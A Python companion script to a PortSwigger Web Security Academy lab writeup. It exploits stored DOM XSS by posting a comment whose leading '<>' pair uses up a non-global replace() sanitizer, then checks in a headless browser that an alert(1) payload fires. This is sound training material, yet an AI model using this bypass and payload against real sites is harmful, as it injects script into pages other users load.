#!/usr/bin/env python3
"""
Stored DOM XSS
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 13-stored-dom-xss.md

What this does:
    The comment system runs submitted text through a client-side sanitizer
    that calls .replace() to strip angle brackets before writing it into
    the DOM via a raw-HTML sink -- but that .replace() call only touches
    the FIRST occurrence of the character, not a global replace. Posting a
    throwaway "<>" pair immediately before the real payload lets the
    sanitizer's single pass get spent on the sacrificial pair, leaving the
    real <img onerror> tag right behind it completely untouched. Posts the
    comment (handling CSRF extraction itself) and confirms execution on
    reload with a headless browser.

Usage:
    python 13-stored-dom-xss.py <lab-url>
    e.g. python 13-stored-dom-xss.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

# The leading <> absorbs the sanitizer's single-pass replace(), leaving the
# real payload intact.
PAYLOAD = "<><img src=1 onerror=alert(1)>"


def get_csrf(client: httpx.Client, path: str) -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    r = client.get("/")
    post_ids = re.findall(r"/post\?postId=(\d+)", r.text)
    if not post_ids:
        print("[-] No blog posts found")
        return
    post_id = post_ids[0]
    post_path = f"/post?postId={post_id}"
    post_url = f"{lab_url}{post_path}"

    csrf = get_csrf(client, post_path)
    client.post("/post/comment", data={
        "postId": post_id,
        "comment": PAYLOAD,
        "name": "attacker",
        "email": "a@b.com",
        "website": "",
        "csrf": csrf,
    })
    print(f"[*] Payload stored in comment on post {post_id}: {PAYLOAD}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(post_url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'} on reload")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
